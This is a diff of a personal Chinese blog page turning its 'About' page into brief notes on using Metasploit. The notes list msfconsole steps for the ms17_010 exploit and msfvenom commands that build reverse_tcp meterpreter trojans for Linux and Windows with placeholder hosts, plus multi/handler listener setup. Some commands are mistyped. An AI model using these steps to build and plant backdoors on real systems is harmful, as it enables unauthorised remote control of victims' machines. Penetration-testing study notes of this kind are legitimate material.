@@ -4,35 +4,37 @@
 
 <head>
     
-    <title>关于 - Wray的Blog</title>
+    <title>msf使用 - Wray的Blog</title>
     <meta charset="UTF-8">
     <meta name="keywords" content="">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
     
     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
-    <meta name="description" content="我是谁我是Wray 作品">
-<meta property="og:type" content="website">
-<meta property="og:title" content="关于">
-<meta property="og:url" content="http://blog.wray7.top/about.html">
+    <meta name="description" content="msf使用metasploit 流程msfconsole  search [ms17_010] 查找漏洞  use [] 选择漏洞  show options 查看参数  session 查看会话 session [num] 选择会话   12run vnc  后门msvenom -p [payload] lhost&#x3D;[] lport&#x3D;[] -f(format) exe -o(output) fi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="msf使用">
+<meta property="og:url" content="http://blog.wray7.top/2023/09/04/Network/Safety/msf%E4%BD%BF%E7%94%A8/index.html">
 <meta property="og:site_name" content="Wray的Blog">
-<meta property="og:description" content="我是谁我是Wray 作品">
+<meta property="og:description" content="msf使用metasploit 流程msfconsole  search [ms17_010] 查找漏洞  use [] 选择漏洞  show options 查看参数  session 查看会话 session [num] 选择会话   12run vnc  后门msvenom -p [payload] lhost&#x3D;[] lport&#x3D;[] -f(format) exe -o(output) fi">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2018-08-19T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-09-04T11:58:51.560Z">
+<meta property="og:image" content="http://blog.wray7.top/home/wray/.config/Typora/typora-user-images/image-20221223144819404.png">
+<meta property="article:published_time" content="2023-09-04T13:48:57.000Z">
+<meta property="article:modified_time" content="2023-09-04T13:48:57.375Z">
 <meta property="article:author" content="Wray Lee">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.wray7.top/home/wray/.config/Typora/typora-user-images/image-20221223144819404.png">
     
 <link rel="stylesheet" href="/lib/fancybox/fancybox.css">
 <link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
 
 
-    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1693835914333">
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1693835914391">
     
-    <link rel="stylesheet" href="/css/style.css?v=1693835914333">
+    <link rel="stylesheet" href="/css/style.css?v=1693835914391">
 
     
         
-            <link rel="stylesheet" href="/custom.css?v=1693835914333">
+            <link rel="stylesheet" href="/custom.css?v=1693835914391">
         
     
 
@@ -41,7 +43,7 @@
 <script src="/lib/fancybox/fancybox.umd.js" async></script>
 
 
-    <script async src="/js/app.js?v=1693835914333"></script>
+    <script async src="/js/app.js?v=1693835914391"></script>
     
      
 
@@ -113,7 +115,7 @@
             </div>
         </a>
         
-        <a class="nexmoe-list-item mdui-list-item mdui-ripple true" href="/about.html" title="关于博主">
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博主">
             <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
             <div class="mdui-list-item-content">
                 关于博主
@@ -265,15 +267,15 @@
     <div class="nexmoe-post">
   <article>
     
-        <div class="nexmoe-post-cover absolute" style="padding-top: 56.375838926174495%;"> 
-            <img src="about/wea.png" alt="关于" loading="lazy">
-            <h1>关于</h1>
+        <div class="nexmoe-post-cover"> 
+            <img src="https://th.bing.com/th/id/R.917ca069a2af6fd72956834eb08358c5?rik=BqcoPnxAZUEIMQ&pid=ImgRaw&r=0" alt="msf使用" loading="lazy">
+            <h1>msf使用</h1>
         </div>
     
     
     <div class="nexmoe-post-meta">
     <div class="nexmoe-rainbow">
-        <a class="nexmoefont icon-calendar-fill">2018年08月20日</a>
+        <a class="nexmoefont icon-calendar-fill">2023年09月04日</a>
         
         
     </div>
@@ -284,8 +286,31 @@
     
 </div>
 
-    <h2 id="我是谁"><a href="#我是谁" class="headerlink" title="我是谁"></a>我是谁</h2><p>我是Wray</p>
-<h2 id="作品"><a href="#作品" class="headerlink" title="作品"></a>作品</h2>
+    <h1 id="msf使用"><a href="#msf使用" class="headerlink" title="msf使用"></a>msf使用</h1><p>metasploit</p>
+<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p><code>msfconsole</code></p>
+<ol>
+<li><p><code>search [ms17_010]</code> 查找漏洞</p>
+</li>
+<li><p><code>use []</code> 选择漏洞</p>
+</li>
+<li><p><code>show options</code> 查看参数</p>
+</li>
+<li><p><code>session</code> 查看会话</p>
+<p><code>session [num]</code> 选择会话</p>
+</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run vnc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p><code>msvenom -p [payload] lhost=[] lport=[] -f(format) exe -o(output) file_name.exe</code></p>
+<h2 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h2><p><code>use exploit/multi/handler</code></p>
+<h1 id="攻击主机"><a href="#攻击主机" class="headerlink" title="攻击主机"></a>攻击主机</h1><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/home/wray/.config/Typora/typora-user-images/image-20221223144819404.png" alt="image-20221223144819404" data-caption="image-20221223144819404" loading="lazy"></p>
+<h3 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h3><p>linux : <code>msvenom -p linux/x64/meterpreter/reverse_tcp lhost=[host] -p=[port] -f elf -o .elf</code></p>
+<p>win: <code>msvenom -p windows/meterpreter/reverse_tcp lhost=[host] -p=[port] -f exe -o .exe</code></p>
+<h3 id="监听木马"><a href="#监听木马" class="headerlink" title="监听木马"></a>监听木马</h3><p><code>handler -p [] lhost=[] -p []</code></p>
+<p><code>use exploit/multi/handler</code></p>
+<p><code>set</code></p>
+<p><code>run</code></p>
+
     
   </article>
 
@@ -293,7 +318,7 @@
       
     <div class="nexmoe-post-copyright">
         <strong>Author：</strong>Wray Lee<br>
-        <strong>Link：</strong><a href="http://blog.wray7.top/about.html" title="http:&#x2F;&#x2F;blog.wray7.top&#x2F;about.html" target="_blank" rel="noopener">http:&#x2F;&#x2F;blog.wray7.top&#x2F;about.html</a><br>
+        <strong>Link：</strong><a href="http://blog.wray7.top/2023/09/04/Network/Safety/msf%E4%BD%BF%E7%94%A8/" title="http:&#x2F;&#x2F;blog.wray7.top&#x2F;2023&#x2F;09&#x2F;04&#x2F;Network&#x2F;Safety&#x2F;msf%E4%BD%BF%E7%94%A8&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;blog.wray7.top&#x2F;2023&#x2F;09&#x2F;04&#x2F;Network&#x2F;Safety&#x2F;msf%E4%BD%BF%E7%94%A8&#x2F;</a><br>
         
             <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
 
@@ -309,7 +334,7 @@
 </div>
   
   
-    <script async src="/js/copy-codeblock.js?v=1693835914313"></script>
+    <script async src="/js/copy-codeblock.js?v=1693835914321"></script>
   
 
   
@@ -330,7 +355,7 @@
                               <button class="mdui-fab catalog" style="overflow:unset;">
                                   <i class="nexmoefont icon-i-catalog"></i>
                                   <div class="nexmoe-toc">
-                                      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91%E6%98%AF%E8%B0%81"><span class="toc-number">1.</span> <span class="toc-text">我是谁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%9C%E5%93%81"><span class="toc-number">2.</span> <span class="toc-text">作品</span></a></li></ol>
+                                      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#msf%E4%BD%BF%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">msf使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E9%97%A8"><span class="toc-number">1.2.</span> <span class="toc-text">后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%91%E5%90%AC"><span class="toc-number">1.3.</span> <span class="toc-text">监听</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E4%B8%BB%E6%9C%BA"><span class="toc-number">2.</span> <span class="toc-text">攻击主机</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.0.1.</span> <span class="toc-text">生成木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%91%E5%90%AC%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.0.2.</span> <span class="toc-text">监听木马</span></a></li></ol></li></ol></li></ol>
                                   </div>
                               </button>
                           
